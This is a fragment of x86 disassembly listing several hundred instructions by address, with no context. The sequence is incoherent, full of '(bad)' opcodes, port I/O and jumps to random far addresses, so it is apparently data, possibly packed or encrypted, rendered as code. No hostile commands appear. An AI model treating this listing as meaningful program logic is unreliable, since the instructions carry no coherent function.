  409450:	add    al,BYTE PTR [edx+0x3e63584f]
  409456:	arpl   WORD PTR [ebp+edi*2+0x68e846dc],bp
  40945d:	sbb    ebx,esi
  40945f:	ror    BYTE PTR [edx-0xf],cl
  409462:	add    ebx,esp
  409464:	out    0x5f,eax
  409466:	mov    dl,0xd6
  409468:	sub    eax,0x8102cfd
  40946d:	sub    DWORD PTR [ecx+0x49],edx
  409470:	or     ebp,DWORD PTR [ecx+0x36810224]
  409476:	call   0xf785:0x96519b22
  40947d:	or     eax,0xd0bc142c
  409482:	and    eax,0x6a525e45
  409487:	pop    ebp
  409488:	or     eax,edi
  40948a:	adc    BYTE PTR [ebx+0x64],0x6b
  40948e:	sub    eax,0xccb4c6f3
  409493:	push   ss
  409494:	aaa    
  409495:	or     BYTE PTR [eax+0x32],ch
  409498:	sbb    DWORD PTR [ebx-0xd],esi
  40949b:	mov    cx,dx
  40949e:	sub    DWORD PTR [edx+0x5a],edx
  4094a1:	adc    ah,BYTE PTR ds:0xa2d44a90
  4094a7:	js     0x4094eb
  4094a9:	inc    edx
  4094aa:	mov    bh,0x23
  4094ac:	popf   
  4094ad:	xor    esi,DWORD PTR [eax+0x283e329f]
  4094b3:	leave  
  4094b4:	or     edi,DWORD PTR [ebp-0x4faaacc8]
  4094ba:	pop    ecx
  4094bb:	sub    esi,DWORD PTR [esi-0x6bd1220f]
  4094c1:	outs   dx,DWORD PTR ds:[esi]
  4094c2:	or     DWORD PTR [edx+ebx*1],edx
  4094c5:	mov    bl,BYTE PTR [eax+edi*2]
  4094c8:	test   al,0x68
  4094ca:	add    BYTE PTR [ecx+esi*1+0x667d135e],cl
  4094d1:	fist   WORD PTR [edx-0x37c9cdbd]
  4094d7:	gs aam 0x25
  4094da:	or     esp,DWORD PTR [edi-0x4c]
  4094dd:	pop    es
  4094de:	arpl   ax,bx
  4094e0:	xchg   DWORD PTR [ebx+eax*2],eax
  4094e3:	dec    edi
  4094e4:	push   edi
  4094e5:	xchg   esi,eax
  4094e6:	xchg   BYTE PTR [eax+edx*1+0xce733cc],ch
  4094ed:	pushf  
  4094ee:	xchg   BYTE PTR [si-0x31b0],ch
  4094f3:	out    0xd5,al
  4094f5:	(bad)  
  4094f6:	xor    BYTE PTR [ecx+0x17],dh
  4094f9:	mov    ds:0xf9c5bb82,al
  4094fe:	je     0x40949f
  409500:	fwait
  409501:	push   edi
  409502:	mov    esi,0xb4eda9cb
  409507:	push   edx
  409508:	out    0xa6,al
  40950a:	cmp    eax,0x6ff6cabf
  40950f:	xchg   BYTE PTR [ebx+eax*1],al
  409512:	push   0x6e43870c
  409517:	fnstsw WORD PTR [edx-0x1280e033]
  40951d:	jns    0x409573
  40951f:	xchg   DWORD PTR [bp+di+0xf],esi
  409523:	cmp    al,0xce
  409525:	out    0xd6,al
  409527:	sub    DWORD PTR [esi+0x5b],eax
  40952a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40952b:	adc    BYTE PTR [ecx-0x48],dl
  40952e:	das    
  40952f:	mov    esi,0x82000aa7
  409534:	xor    BYTE PTR [ebx-0x3f191c40],0xbc
  40953b:	push   ebp
  40953c:	add    DWORD PTR [ebp-0x6bb3a156],ebx
  409542:	add    esp,eax
  409544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409545:	pop    es
  409546:	(bad)  
  409547:	in     al,0x48
  409549:	cmp    ebp,DWORD PTR [edi-0x6cb7d140]
  40954f:	add    eax,0xca63c78c
  409554:	mov    dl,0x5c
  409556:	data16 sahf 
  409558:	mov    al,0x7f
  40955a:	inc    esp
  40955b:	in     eax,dx
  40955c:	mov    ebp,0x381f923
  409561:	shl    cl,0x78
  409564:	call   DWORD PTR [ecx-0x20]
  409567:	rcl    DWORD PTR [esi],cl
  409569:	imul   ebp,DWORD PTR ds:[ebp+0x396365fd],0xd8f8515d
  409574:	sub    ebx,DWORD PTR [edi]
  409576:	in     al,dx
  409577:	jns    0x4095c4
  409579:	hlt    
  40957a:	jnp    0x4095bd
  40957c:	cmc    
  40957d:	lods   eax,DWORD PTR ds:[esi]
  40957e:	icebp  
  40957f:	mov    eax,ds:0x7d26e91e
  409584:	or     al,0x8d
  409586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409587:	sub    al,0xb
  409589:	mov    dl,0xb9
  40958b:	jae    0x40956b
  40958d:	cmp    DWORD PTR [ebp-0x7913c6f1],eax
  409593:	mov    ds:0x928a2928,al
  409598:	push   edx
  409599:	fwait
  40959a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40959b:	jmp    0xde3fac36
  4095a0:	cmc    
  4095a1:	(bad)  
  4095a3:	ss ret 0x925a
  4095a7:	mov    BYTE PTR [eax+eiz*4+0x52],0x4a
  4095ac:	push   cs
  4095ad:	mov    BYTE PTR [edi],0xec
  4095b0:	pop    ds
  4095b1:	pop    edx
  4095b2:	sub    al,0xa
  4095b4:	jmp    0x71195a6
  4095b9:	add    DWORD PTR [ebx+0x54ad0051],0x32
  4095c0:	call   0x946a26c
  4095c5:	in     eax,dx
  4095c6:	mov    dh,0xe4
  4095c8:	jo     0x409570
  4095ca:	pop    ecx
  4095cb:	out    dx,al
  4095cc:	lea    ebx,[ebx]
  4095ce:	imul   eax,ecx,0x7d5e1db1
  4095d4:	scas   eax,DWORD PTR es:[edi]
  4095d5:	jbe    0x4095ad
  4095d7:	call   0x73a2f354
  4095dc:	daa    
  4095dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095de:	hlt    
  4095df:	dec    ebp
  4095e0:	mov    dh,0x10
  4095e2:	cmp    DWORD PTR [ecx],ecx
  4095e4:	xchg   edi,eax
  4095e5:	mov    ds,WORD PTR [ebp-0x3b]
  4095e8:	add    ah,BYTE PTR [edx+0xa986d7b]
  4095ee:	(bad)  
  4095ef:	cmp    edi,DWORD PTR [eax+0xf9c2f2]
  4095f5:	mov    dl,0x82
  4095f7:	retf   0x69e1
  4095fa:	xor    al,0x18
  4095fc:	jmp    0xd2173beb
  409601:	inc    ebp
  409602:	fcom   DWORD PTR [ebx]
  409604:	mov    esi,0x3719f3e4
  409609:	scas   al,BYTE PTR es:[edi]
  40960a:	jl     0x4095ab
  40960c:	xchg   ebx,eax
  40960d:	pop    ebx
  40960e:	sub    BYTE PTR [ebp+0x34a5adcd],0xdf
  409615:	push   ebp
  409616:	mov    eax,ds:0x55d750be
  40961b:	popf   
  40961c:	fcmovnb st,st(5)
  40961e:	inc    esp
  40961f:	call   0x1326:0x4cdbdbdb
  409626:	(bad)  
  409627:	call   0xaea175d7
  40962c:	cmp    edi,DWORD PTR [esi+esi*8]
  40962f:	fdivr  st,st(3)
  409631:	sbb    BYTE PTR [ebp-0x63],ch
  409634:	fs mov ah,0x79
  409637:	add    ah,BYTE PTR [ebp+0x44fdfad2]
  40963d:	xor    eax,0x4c4ad550
  409642:	test   DWORD PTR ds:0xa3d9114b,0xc5daccaa
  40964c:	nop
  40964d:	loopne 0x4096a9
  40964f:	push   ds
  409650:	add    BYTE PTR [esi],0x61
  409653:	or     bl,dl
  409655:	mov    DWORD PTR [esi+0x2c],esi
  409658:	mov    eax,ds:0x39e12681
  40965d:	xchg   esp,eax
  40965e:	push   edx
  40965f:	push   ebp
  409660:	adc    dl,al
  409662:	or     al,BYTE PTR [eax]
  409664:	cmp    BYTE PTR [esi+edi*4-0x15],bl
  409668:	ja     0x409698
  40966a:	out    dx,eax
  40966b:	sub    al,BYTE PTR [eax]
  40966d:	in     al,dx
  40966e:	out    dx,eax
  40966f:	out    dx,eax
  409670:	jbe    0x4095f7
  409672:	adc    BYTE PTR [edi+0x8],cl
  409675:	sar    DWORD PTR [ebx-0x53],0xe5
  409679:	push   ecx
  40967a:	add    DWORD PTR [edi-0x6d0325d0],ebx
  409680:	(bad)
  409683:	sub    ch,BYTE PTR [edi+0x63]
  409686:	inc    edi
  409687:	pop    esi
  409688:	add    al,0x0
  40968a:	jne    0x4096ec
  40968c:	add    dl,ah
  40968e:	adc    BYTE PTR [eax-0x7f0d4cf4],dl
  409694:	shl    DWORD PTR ds:0xeb44bcf9,1
  40969a:	add    ah,BYTE PTR [ebx-0x74]
  40969d:	ja     0x4096f1
  40969f:	imul   ebx,DWORD PTR [edi-0x5a2e594b],0x42f5ff76
  4096a9:	jmp    0x95996f05
  4096ae:	sbb    BYTE PTR [ebx+0x30],ah
  4096b1:	pop    edx
  4096b2:	mov    ds:0xa77692cb,eax
  4096b7:	push   ebx
  4096b8:	jae    0x4096fa
  4096ba:	test   eax,0xd6fb7144
  4096bf:	push   ds
  4096c0:	sti    
  4096c1:	jnp    0x40968d
  4096c3:	(bad)  
  4096c4:	inc    BYTE PTR [ebp-0x3f16b705]
  4096ca:	ret    
  4096cb:	sub    al,0x5a
  4096cd:	xchg   edi,eax
  4096ce:	dec    edx
  4096cf:	and    al,0xbd
  4096d1:	pop    esi
  4096d2:	ret    0xd868
  4096d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096d6:	(bad)  
  4096d8:	fstp   DWORD PTR [edi]
  4096da:	xchg   edi,eax
  4096db:	into   
  4096dc:	sbb    DWORD PTR [eax-0x3dc0f3ec],edi
  4096e2:	mov    dl,0x8c
  4096e4:	popf   
  4096e5:	xor    DWORD PTR ds:0xb68d809f,0xacf55235
  4096ef:	aas    
  4096f0:	push   edi
  4096f1:	fcom   QWORD PTR [edx+0x4089302b]
  4096f7:	mov    eax,ds:0xa6a01ec6
  4096fc:	in     al,0xab
  4096fe:	int3   
  4096ff:	or     eax,0xba6a861
  409704:	repz mov esi,0x450c6d00
  40970a:	sub    ecx,ecx
  40970c:	jb     0x4096d9
  40970e:	sub    al,0xb
  409710:	and    eax,DWORD PTR [ebx]
  409712:	sub    eax,0x860477b9
  409717:	ss sub al,0x1a
  40971a:	pop    eax
  40971b:	push   ebx
  40971c:	mov    cl,0x2
  40971e:	jmp    0x409792
  409720:	cld    
  409721:	das    
  409722:	mov    esp,0x36a73cf1
  409727:	addr16 pushf 
  409729:	fcomp  st(1)
  40972b:	lods   al,BYTE PTR ds:[esi]
  40972c:	int    0xe8
  40972e:	adc    esp,DWORD PTR [ecx+ecx*1+0x10677104]
  409735:	shl    DWORD PTR [ebp+0x6b],cl
  409738:	sub    eax,0xeb9ba1c3
  40973d:	out    dx,eax
  40973e:	dec    edi
  40973f:	sahf   
  409740:	stc    
  409741:	xor    ebp,DWORD PTR [esi-0x14]
  409744:	push   ss
  409745:	cmp    al,0xf2
  409747:	ficomp WORD PTR [edi+0x14eb7364]
  40974d:	pop    ebx
  40974e:	pop    ebx
  40974f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409750:	push   0xa295bbb5
  409755:	scas   al,BYTE PTR es:[edi]
  409756:	lods   al,BYTE PTR ds:[esi]
  409757:	out    dx,al
  409758:	push   0x6b48d373
  40975d:	mov    esi,0xe32838a2
  409762:	scas   al,BYTE PTR es:[edi]
  409763:	mov    ebp,0x663a0060
  409768:	add    dh,bl
  40976a:	or     al,0x30
  40976c:	cmp    ah,bl
  40976e:	(bad)  
  40976f:	into   
  409770:	nop
  409771:	and    al,0x4d
  409773:	sub    edx,ecx
  409775:	ins    BYTE PTR es:[edi],dx
  409776:	leave  
  409777:	add    al,0x8
  409779:	mov    DWORD PTR [eax-0x33],eax
  40977c:	add    DWORD PTR [esi-0x2f],ecx
  40977f:	retf   
  409780:	stc    
  409781:	shl    DWORD PTR [edi],1
  409783:	add    esi,esi
  409785:	div    DWORD PTR [edi+0x15]
  409788:	jo     0x409794
  40978a:	clc    
  40978b:	add    eax,0x3e5893e0
  409790:	lods   eax,DWORD PTR gs:[esi]
  409792:	jge    0x409760
  409794:	pop    eax
  409795:	(bad)  [edx-0x32]
  409798:	mov    ecx,0x888776c8
  40979d:	loop   0x4097e6
  40979f:	and    DWORD PTR [ebx-0x4bf05138],edi
  4097a5:	ds dec ecx
  4097a7:	push   edx
  4097a8:	push   esp
  4097a9:	xchg   edx,eax
  4097aa:	add    dh,cl
  4097ac:	add    DWORD PTR [edi-0x669ae699],edx
  4097b2:	das    
  4097b3:	retf   0x6f1b
  4097b6:	jecxz  0x40974f
  4097b8:	xchg   BYTE PTR [edi+ebp*1],bh
  4097bb:	enter  0x128b,0x1d
  4097bf:	inc    edx
  4097c0:	jg     0x4097c0
  4097c2:	ins    DWORD PTR es:[edi],dx
  4097c3:	mov    ebx,0x8fa75446
  4097c8:	int    0x91
  4097ca:	pop    eax
  4097cb:	mov    al,0x50
  4097cd:	cdq    
  4097ce:	cmp    al,0xcf
  4097d0:	sub    DWORD PTR [edx-0x2bdd4afe],ecx
  4097d6:	je     0x4097bd
  4097d8:	jmp    0x614:0x6dc7f64d
  4097df:	add    eax,0x6f784a24
  4097e4:	ja     0x4097ae
  4097e6:	sub    eax,0x67026cf0
  4097eb:	push   es
  4097ec:	ins    BYTE PTR es:[edi],dx
  4097ed:	push   cs
  4097ee:	pop    ebp
  4097ef:	(bad)  
  4097f0:	shr    BYTE PTR [ebp-0x64a5e625],1
  4097f6:	test   edx,ebp
  4097f8:	das    
  4097f9:	sub    DWORD PTR [ebp-0x2c],esi
  4097fc:	jecxz  0x409808
  4097fe:	scas   eax,DWORD PTR es:[edi]
  4097ff:	ins    BYTE PTR es:[edi],dx
  409800:	mov    ch,0x9c
  409802:	add    eax,0xb016220c
  409808:	fs iret 
  40980a:	(bad)  
  40980b:	or     DWORD PTR [ecx+edx*8],edi
  40980e:	xchg   esp,eax
  40980f:	loope  0x409826
  409811:	fwait
  409812:	push   0xce891686
  409817:	pop    ss
  409818:	add    eax,DWORD PTR [edi+edi*4+0x4113259d]
  40981f:	js     0x40982d
  409821:	jo     0x409814
  409823:	(bad)  
  409824:	mov    esp,0x9873cc30
  409829:	into   
  40982a:	or     eax,0xe7cc39f3
  40982f:	xchg   edx,eax
  409830:	mov    esp,0x29402c70
  409835:	push   edi
  409836:	dec    esi
  409837:	test   BYTE PTR [ecx],bl
  409839:	xor    DWORD PTR [ebx+0x73fa0e4a],esp
  40983f:	cmc    
  409840:	shr    BYTE PTR [ebx-0x3b1f23dc],cl
  409846:	into   
  409847:	fldcw  WORD PTR [edx+0x7d6937f1]
  40984d:	in     al,dx
  40984e:	and    BYTE PTR [ebx+0x4e],ch
  409851:	xchg   ebp,eax
  409852:	adc    eax,0x3060f903
  409857:	mov    al,ds:0xd5f0e9d3
  40985c:	scas   eax,DWORD PTR es:[edi]
  40985d:	cmp    eax,0x6fe7abc7
  409862:	repz shl BYTE PTR [ebx],0x1f
  409866:	fs imul edi,ebx,0xc
  40986a:	mov    ds:0x1da453ed,eax
  40986f:	mov    bh,0xe8
  409871:	addr16 jne 0x4098d0
  409874:	clc    
  409875:	shl    DWORD PTR [edx+eax*2],cl
  409878:	sub    eax,DWORD PTR [esi+eax*4+0x72]
  40987c:	mov    edx,DWORD PTR [ecx+edx*4-0x26]
  409880:	cmp    DWORD PTR [edx-0x2c298cb],eax
  409886:	scas   eax,DWORD PTR es:[edi]
  409887:	inc    esi
  409888:	add    BYTE PTR [edx-0x6],bh
  40988b:	pop    edi
  40988c:	adc    al,0x90
  40988e:	cwde   
  40988f:	or     DWORD PTR [ebx+0x1e3bcb5e],eax
  409895:	pop    ss
  409896:	int3   
  409897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409898:	stc    
  409899:	jl     0x40982e
  40989b:	leave  
  40989c:	fs push ebp
  40989e:	js     0x4098d3
  4098a0:	pop    es
  4098a1:	out    dx,al
  4098a2:	fld    TBYTE PTR [edx+0x40]
  4098a5:	mov    cl,0xbc
  4098a7:	arpl   WORD PTR [eax],ax
  4098a9:	sbb    BYTE PTR [edi-0xd29a509],cl
  4098af:	pop    ecx
  4098b0:	pushf  
  4098b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b2:	(bad)  
  4098b3:	jecxz  0x4098cb
  4098b5:	ds push 0x2f061dad
  4098bb:	cmp    eax,0xc671422c
  4098c0:	sbb    bh,dh
  4098c2:	loop   0x409867
  4098c4:	sahf   
  4098c5:	fidivr WORD PTR [ecx]
  4098c7:	dec    esi
  4098c8:	mov    WORD PTR [ebx],gs
  4098ca:	arpl   WORD PTR [edi],dx
  4098cc:	mov    ah,0xbe
  4098ce:	xchg   ebp,eax
  4098cf:	mov    dh,0xdd
  4098d1:	inc    edx
  4098d2:	sbb    al,0xde
  4098d4:	jmp    0x7c8f360f
  4098d9:	mov    dh,cl
  4098db:	push   esp
  4098dc:	pushf  
  4098dd:	rcr    BYTE PTR [eax+0x4b],cl
  4098e0:	pop    ecx
  4098e1:	xchg   esp,eax
  4098e2:	fs pop ecx
  4098e4:	dec    esi
  4098e5:	mov    eax,ds:0xa1649fb5
  4098ea:	fisubr WORD PTR [eax]
  4098ec:	bound  ebp,QWORD PTR [edx+0x7f]
  4098ef:	dec    edi
  4098f0:	bound  ebx,QWORD PTR [ebp-0x12]
  4098f3:	jg     0x409907
  4098f5:	das    
  4098f6:	jp     0x409917
  4098f8:	sub    DWORD PTR [ebx+0x26f9a65b],ecx
  4098fe:	pop    ecx
  4098ff:	rol    DWORD PTR [esi],1
  409901:	popa   
  409902:	push   ecx
  409903:	ret    0xa4a2
  409906:	inc    ebp
  409907:	dec    edx
  409908:	add    ebp,0xffffffd4
  40990b:	pushf  
  40990c:	nop
  40990d:	add    BYTE PTR [edx],ch
  40990f:	adc    DWORD PTR [edx+edi*1+0x9],esi
  409913:	cmp    DWORD PTR [esi+0x42],0xffffffab
  409917:	and    eax,0x81c6e799
  40991c:	push   ebx
  40991d:	(bad)  
  40991e:	(bad)  
  40991f:	aaa    
  409920:	add    DWORD PTR [eax-0x3a95413b],eax
  409926:	loope  0x40997d
  409928:	arpl   WORD PTR [ebx],ax
  40992a:	les    ecx,FWORD PTR [edx]
  40992c:	add    BYTE PTR [eax-0xb],ah
  40992f:	mov    dh,0xda
  409931:	xor    eax,0xa26336fc
  409936:	popa   
  409937:	jnp    0x4098c6
  409939:	jb     0x4098bc
  40993b:	inc    edx
  40993d:	add    ah,BYTE PTR [eax]
  40993f:	inc    esp
  409940:	add    BYTE PTR fs:[esp+ecx*4+0xd561d40],0x76
  409949:	add    DWORD PTR [edx-0x2d35fd4e],0x52
  409950:	push   0x41
  409952:	loop   0x4098fb
  409954:	or     DWORD PTR [esi-0x1c2b4fba],edx
  40995a:	or     bl,al
  40995c:	mov    ebx,0xcb8a0975
  409961:	mov    esp,0xc4b3f1ef
  409966:	dec    ecx
  409967:	cmp    ebp,DWORD PTR [esi+0x58efdcfa]
  40996d:	jmp    0xfdca1ed5
  409972:	add    al,0xc1
  409974:	sbb    ecx,DWORD PTR fs:[ebp-0x641c83ba]
  40997b:	das    
  40997c:	lock popf 
  40997e:	xchg   edi,eax
  40997f:	cs jno 0x409974
  409982:	in     al,dx
  409983:	adc    ebx,DWORD PTR [eax+edi*1-0x2464ff0b]
  40998a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40998b:	call   0x7d812106
  409990:	mov    esi,ebp
  409992:	mov    al,ds:0x5afbcdb4
  409997:	aad    0x4e
  409999:	mov    ah,0x6d
  40999b:	adc    al,0xf3
  40999d:	aas    
  40999e:	bound  eax,QWORD PTR [edi]
  4099a0:	addr16 jo 0x4099a5
  4099a3:	xchg   cl,cl
  4099a5:	inc    ecx
  4099a6:	loop   0x409a0d
  4099a8:	retf   
  4099a9:	mov    ch,0x81
  4099ab:	cs push ebx
  4099ad:	and    al,0xab
  4099af:	xchg   DWORD PTR [eax],eax
  4099b1:	xchg   DWORD PTR [edi+0x2a],esp
  4099b4:	retf   
  4099b5:	xchg   edx,eax
  4099b6:	add    DWORD PTR [ebx-0x581faa7d],0xffffff81
  4099bd:	icebp  
  4099be:	repnz popf 
  4099c0:	mov    ebp,0xdb7973
  4099c5:	push   eax
  4099c6:	adc    al,0xf9
  4099c8:	xchg   esi,esp
  4099ca:	repz (bad) 
  4099cd:	add    eax,0x9295d7f1
  4099d2:	pop    ds
  4099d3:	dec    esi
  4099d4:	xchg   esp,eax
  4099d5:	jb     0x4099ea
  4099d7:	sbb    eax,0x3274c35a
  4099dc:	mov    eax,ds:0x6706ded0
  4099e1:	xor    DWORD PTR [esi+ecx*8+0x1b],0xa804c44f
  4099e9:	fisub  DWORD PTR [ebx-0x4766f5ae]
  4099ef:	popa   
  4099f0:	cdq    
  4099f1:	push   ss
  4099f2:	sub    bl,cl
  4099f4:	or     cl,0xf4
  4099f7:	shr    BYTE PTR [ebp+0x460d6ab8],1
  4099fd:	fwait
  4099fe:	or     dl,BYTE PTR [eax-0xe]
  409a01:	mov    ds:0xf272cf24,al
  409a06:	rcr    cl,cl
  409a08:	hlt    
  409a09:	mov    eax,ds:0xbfb39b42
  409a0e:	fmul   QWORD PTR [ebx+0x2f6b6384]
  409a14:	lds    ebx,FWORD PTR [edx-0x36]
  409a17:	loopne 0x409a19
  409a19:	pop    esp
  409a1a:	sbb    bh,dh
  409a1c:	outs   dx,BYTE PTR ds:[esi]
  409a1d:	sbb    BYTE PTR [eax-0x4b43a3cb],dh
  409a23:	mov    edx,esi
  409a25:	ins    DWORD PTR es:[edi],dx
  409a26:	pop    edx
  409a27:	ins    DWORD PTR es:[edi],dx
  409a28:	out    0xfc,eax
  409a2a:	xchg   ebx,eax
  409a2b:	dec    edx
  409a2c:	loop   0x409a31
  409a2e:	add    BYTE PTR [eax],bl
  409a30:	stos   DWORD PTR es:[edi],eax
  409a31:	std    
  409a32:	jae    0x409a7d
  409a34:	rcr    BYTE PTR [ecx+0x64b69d05],0x63
  409a3b:	nop
  409a3c:	shr    ch,cl
  409a3e:	sub    ah,BYTE PTR [esi-0x2b6598cd]
  409a44:	pop    ecx
  409a45:	ror    BYTE PTR [edx+0x3e57b5b5],0x46
  409a4c:	fsubr  st(3),st
  409a4e:	inc    edi
  409a4f:	cs in  al,dx
  409a51:	push   ebp
  409a52:	sub    al,0x20
  409a54:	out    0xd9,al
  409a56:	push   ebp
  409a57:	cmp    al,0x1f
  409a59:	push   ss
  409a5a:	cdq    
  409a5b:	or     DWORD PTR [ebp+0x2df35fd6],0x889702ac
  409a65:	pop    ecx
  409a66:	clc    
  409a67:	in     eax,dx
  409a68:	(bad)  
  409a69:	jp     0x4099fa
  409a6b:	ja     0x409ace
  409a6d:	cmp    eax,0x85149013
  409a72:	dec    ebx
  409a73:	or     edx,esi
  409a75:	(bad)  
  409a76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a77:	push   ebx
  409a78:	dec    ebx
  409a79:	mov    ecx,0x6407fc22
  409a7e:	mov    bl,0x9
  409a80:	mov    bh,0xae
  409a82:	jge    0x409a1b
  409a84:	daa    
  409a85:	pop    ds
  409a86:	jmp    0x409a59
  409a88:	push   0xffffffb5
  409a8a:	enter  0xacb2,0x9a
  409a8e:	enter  0x7833,0xf2
  409a92:	jecxz  0x409a72
  409a94:	ds mov esp,0x102a38df
  409a9a:	ficom  WORD PTR [edi-0x66]
  409a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a9e:	mov    WORD PTR [esi+0x23],es
  409aa1:	pop    esi
  409aa2:	cli    
  409aa3:	(bad)  
  409aa4:	stos   DWORD PTR es:[edi],eax
  409aa5:	jl     0x409a94
  409aa7:	mov    ecx,0xf5b1b3ef
  409aac:	adc    BYTE PTR [edi],ah
  409aae:	dec    edi
  409aaf:	cmp    eax,0x69f6d6c4
  409ab4:	push   es
  409ab5:	sbb    ebx,DWORD PTR [ebx-0x80]
  409ab8:	je     0x409a44
  409aba:	fst    DWORD PTR [esi+esi*8+0x66]
  409abe:	cmc    
  409abf:	(bad)  
  409ac0:	aad    0xb5
  409ac2:	mov    edx,0x22fabf6
  409ac7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac8:	xchg   ebp,eax
  409ac9:	mov    cl,0x18
  409acb:	jecxz  0x409a83
  409acd:	push   ebp
  409ace:	data16 or BYTE PTR ds:0xba5b934b,0x69
  409ad6:	rol    esi,0x46
  409ad9:	scas   eax,DWORD PTR es:[edi]
  409ada:	mov    dl,0xff
  409adc:	push   edi
  409add:	or     eax,0xd6d6b607
  409ae2:	out    0x35,al
  409ae4:	mov    edx,ds
  409ae6:	jb     0x409ab1
  409ae8:	(bad)
  409aec:	hlt    
  409aed:	dec    edi
  409aee:	push   esp
  409af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409af1:	aas    
  409af2:	(bad)  
  409af3:	icebp  
  409af4:	(bad)  
  409af5:	dec    edi
  409af7:	(bad)  
  409af8:	call   0xc024981c
  409afd:	xor    bl,BYTE PTR [ebp+0x1ee0bb4e]
  409b03:	pusha  
  409b04:	xor    BYTE PTR [eax],bl
  409b06:	jo     0x409b02
  409b08:	hlt    
  409b09:	imul   ebx,esi,0xf9c7defb
  409b0f:	hlt    
  409b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b11:	push   DWORD PTR [edx]
  409b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b14:	dec    esi
  409b15:	popf   
  409b16:	and    al,0xcb
  409b18:	xor    cl,BYTE PTR [esi]
  409b1a:	div    BYTE PTR [esi+0x29]
  409b1d:	retf   0xeab2
  409b20:	stc    
  409b21:	shr    DWORD PTR [ecx],0x7b
  409b24:	xchg   edx,eax
  409b25:	mov    dh,0x5c
  409b27:	adc    cl,BYTE PTR [esi]
  409b29:	cs mov cl,0x46
  409b2c:	jmp    0x409ac0
  409b2e:	and    cl,bl
  409b30:	cwde   
  409b31:	xchg   ebp,eax
  409b32:	push   ebx
  409b33:	mov    ecx,ss
  409b35:	ds cmp al,0xe7
  409b38:	(bad)  
  409b39:	iretw  
  409b3b:	repnz cmp BYTE PTR [edi+ecx*8],0x31
  409b40:	(bad)  
  409b41:	iret   
  409b42:	dec    ebx
  409b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b44:	retf   
  409b45:	or     cl,ch
  409b47:	fwait
  409b48:	push   ds
  409b49:	jecxz  0x409aee
  409b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b4c:	test   eax,0xb850abe8
  409b51:	sub    cl,BYTE PTR [ebx]
  409b53:	dec    esp
  409b54:	addr16 mov bl,0x25
  409b57:	inc    edi
  409b58:	mov    WORD PTR [edx+eax*4+0x74b9ccb2],ss
  409b5f:	jns    0x409b6b
  409b61:	ins    BYTE PTR es:[edi],dx
  409b62:	and    ah,BYTE PTR [ebp-0x3dac0135]
  409b68:	(bad)  
  409b69:	in     al,dx
  409b6a:	stos   BYTE PTR es:[edi],al
  409b6b:	jl     0x409b84
  409b6d:	pop    esi
  409b6e:	jns    0x409be0
  409b70:	dec    esi
  409b71:	int3   
  409b72:	xor    al,0x15
  409b74:	ins    BYTE PTR es:[edi],dx
  409b75:	or     al,0x24
  409b77:	fwait
  409b78:	inc    ebx
  409b79:	leave  
  409b7a:	je     0x409b66
  409b7c:	out    dx,al
  409b7d:	pop    edi
  409b7e:	imul   ecx,DWORD PTR [ebx],0x22
  409b81:	icebp  
  409b82:	lea    ebp,[esi]
  409b84:	sub    BYTE PTR [esp+ebx*8-0x6],bh
  409b88:	mov    esp,0xcb40d9f2
  409b8d:	xor    eax,0xab00f5b5
  409b92:	adc    eax,0xf5bd1a38
  409b97:	push   edx
  409b98:	test   al,0x2f
  409b9a:	into   
  409b9b:	or     al,0x8c
  409b9d:	dec    ebp
  409b9e:	push   cs
  409b9f:	jg     0x409b7f
  409ba1:	sbb    cl,BYTE PTR [ebx]
  409ba3:	mov    ch,cl
  409ba5:	xchg   DWORD PTR [eax-0x22],esi
  409ba8:	nop
  409ba9:	fs in  al,0xbf
  409bac:	xchg   DWORD PTR [ebx-0x4e],edi
  409baf:	push   cs
  409bb0:	or     al,0xb5
  409bb2:	push   esi
  409bb3:	outs   dx,BYTE PTR ds:[esi]
  409bb4:	or     eax,0x9d30ccbc
  409bb9:	pop    ebx
  409bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bbb:	cdq    
  409bbc:	and    ebx,ecx
  409bbe:	and    al,0xb9
  409bc0:	syscall 
  409bc2:	or     ch,BYTE PTR [edx+edx*2]
  409bc5:	add    BYTE PTR [eax+0x54],0x69
  409bc9:	push   es
  409bca:	(bad)  
  409bcb:	push   0x6e
  409bcd:	pop    esp
  409bce:	stc    
  409bcf:	push   ds
  409bd0:	setg   BYTE PTR [ebp-0x4f]
  409bd4:	mov    cl,0xd1
  409bd6:	scas   eax,DWORD PTR es:[edi]
  409bd7:	test   al,0x7f
  409bd9:	push   eax
  409bda:	clc    
  409bdb:	mov    eax,0x7e958fc7
  409be0:	push   ebp
  409be1:	mov    eax,0xd6c5294f
  409be6:	(bad)  
  409be7:	push   ss
  409be8:	pop    ss
  409be9:	das    
  409bea:	pop    esi
  409beb:	out    0xcb,al
  409bed:	pop    edi
  409bee:	jge    0x409b8e
  409bf0:	mov    ah,0x7b
  409bf2:	mov    dl,bl
  409bf4:	addr16 ffreep st(3)
  409bf7:	(bad)  
  409bf8:	into   
  409bf9:	sbb    DWORD PTR [edx-0x3],edi
  409bfc:	sub    eax,0x50e855ac
  409c01:	add    ecx,DWORD PTR ds:0x2834bf8a
  409c07:	sub    DWORD PTR [eax-0x5],edx
  409c0a:	push   ebp
  409c0b:	int    0xa2
  409c0d:	inc    ecx
  409c0e:	bound  eax,QWORD PTR [edx-0x71]
  409c11:	pop    edi
  409c12:	mov    ecx,0x7363c02
  409c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c18:	pop    edi
